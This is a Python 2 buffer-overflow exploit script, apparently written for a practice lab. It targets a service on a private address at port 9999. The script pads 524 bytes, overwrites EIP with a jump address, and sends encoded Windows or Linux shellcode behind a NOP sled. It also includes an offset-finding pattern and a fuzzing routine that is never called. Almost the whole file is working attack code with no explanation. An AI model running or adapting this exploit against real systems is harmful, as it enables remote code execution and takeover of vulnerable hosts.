#!/usr/bin/python
import sys, socket
from time import sleep

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"

#524 bytes

rhost = "192.168.1.193"
rport = 9999

junk = "\x41" * 524
eip = "\xf3\x12\x17\x31"
shellcode_windows = "\x90" * 13 + (
"\xd9\xd0\xba\x23\x42\xd5\xfe\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x63\x31\x53\x1a\x03\x53\x1a\x83\xc3\x04\xe2\xd6\x99\x0a\x40"
"\x66\xd9\x3d\x67\x4f\x91\x19\x6c\x32\x69\xab\x3d\x91\xbc\x5e"
"\x29\xaa\x52\x5c\x56\xa7\x78\xf7\x76\x9d\x8a\xd8\xcb\x04\x18"
"\x92\x71\x47\xdd\x43\xe4\x07\x1e\xbb\x25\x24\x1a\x9e\xc4\x07"
"\xf7\x8f\x05\x60\x19\xb4\x12\xf7\x9d\xc7\x91\x0c\xca\x2d\x97"
"\xbe\xb5\xeb\x96\x83\x30\xb4\x06\x39\x20\xa3\xc3\xe9\x37\x7f"
"\x7c\x54\x0d\xbf\xa9\x91\xdf\x89\xe2\x3a\x33\xea\xb6\x7a\xb1"
"\xcc\x16\x9c\x45\xe2\x96\x09\x5f\xb0\x40\xa0\x04\xbe\x97\x2d"
"\x52\x95\x68\x88\x8a\xd6\x11\x92\x03\x66\x8f\x12\x62\xc5\xa7"
"\xf1\x89\xe8\xd7\x1d\xa7\x71\x60\x49\xa2\x07\x4e\xaa\xc9\x8d"
"\xd0\x24\x19\xa0\x37\xba\xd5\xb1\xca\x37\x89\x4d\xf2\xe5\x76"
"\x0f\x23\x37\x99\x9d\x60\xa9\xca\x69\x49\x4f\x71\x91\x7f\xad"
"\x20\xe4\x81\xb2\x15\x44\x0d\xfd\xe3\x46\xe9\x86\x47\xdf\xef"
"\x62\xb1\xa9\x84\xb9\x7a\x83\xe7\xb1\xe9\xa1\xaa\xe4\xc0\x03"
"\x7a\x0a\x27\x02\xc0\x91\xc1\x21\x3e\x5a\x1f\xbf\xb3\x55\x2a"
"\x39\xfa\x86\xcc\x0c\xc5\x0d\x6f\xa6\x97\x31\xda\x92\x2b\xc4"
"\x47\xfc\xf1\x0c\x8f\xe4\x4e\x85\xd5\xfb\xd6\x04\xfc\xc1\xf4"
"\xc9\xca\x8e\x9d\x5c\x7f\x5b\x62\x02\x26\x23\x3d\x64\xfb\xd5"
"\xd1\x3a\x16\xfd\x34\x45\x4d\x92\x57\x36\xe0\xc0\xf6\xd7\x53"
"\x8a\xd4\xc9\x2f\x58\x09\xbc\x4f\x0a\x66\x8e\x84\x24\xb1\x02"
"\x92\xd3\x8f\x32\xc1\x2b\xed\xd1\x16\x5c\x2e\xdb\x77\x55\xa4"
"\xa2\xe5\xed\x44\xd4\x99\xf3\x51\x77\x62\x99\x2d\x36\x1b\x27"
"\xe3\x8a\x82\xe2\x07\x77\xe2\x56\x2a\x95\xb9\xf4\x12\x05\x67"
"\xa5\x58\x27\x9b\x96\x83\x4b\x38\x31\xb0\x35\xa8\x0d\x7b\x61"
"\x73\x06\x62\xdb\xb1\xa8\x13\xef\xba\xe2\x10\x60\x3c\xad\xad"
"\x38\x21\x0c\xaa\x66\x30\x43\xbf\xcf\xd4\xcb\xcf\xbe\x7a\x95"
"\x2b\x48\x89\x46\xb2\x46\xfc\xa5\xa1\x6b\xb7\x38\x45\xe9\xbd"
"\xd8\x23")

shellcode_linux = "\x90" * 13 + (
"\xda\xcf\xba\xc7\xad\xda\xc1\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x12\x31\x53\x17\x03\x53\x17\x83\x2c\x51\x38\x34\x83\x71\x4a"
"\x54\xb0\xc6\xe6\xf1\x34\x40\xe9\xb6\x5e\x9f\x6a\x25\xc7\xaf"
"\x54\x87\x77\x86\xd3\xee\x1f\xd9\x8c\x10\x4f\xb1\xce\x12\x7e"
"\x1e\x46\xf3\x30\xf8\x08\xa5\x63\xb6\xaa\xcc\x62\x75\x2c\x9c"
"\x0c\xe8\x02\x52\xa4\x9c\x73\xbb\x56\x34\x05\x20\xc4\x95\x9c"
"\x46\x58\x12\x52\x08")


buffer = junk + eip + shellcode_linux

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "[-] Connecting to " + str(rhost)
    s.connect((rhost, rport))
    s.recv(1024)

    # Send payload
    print "[-] Sending payload.... "
    s.send(buffer)
    print "Done"

except:
    print "[-] Unable to connect to " + str(rhost)
    sys.exit(0)


def fuzzing():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((rhost, rport))
            s.recv(1024)
            s.send(buffer)
            print "Sending " + str(len(buffer)) + " bytes"
            sleep(1)
            buffer += "A" * 100
        except:
            print "Failed at " + str(len(buffer)) + " bytes"
            sys.exit()

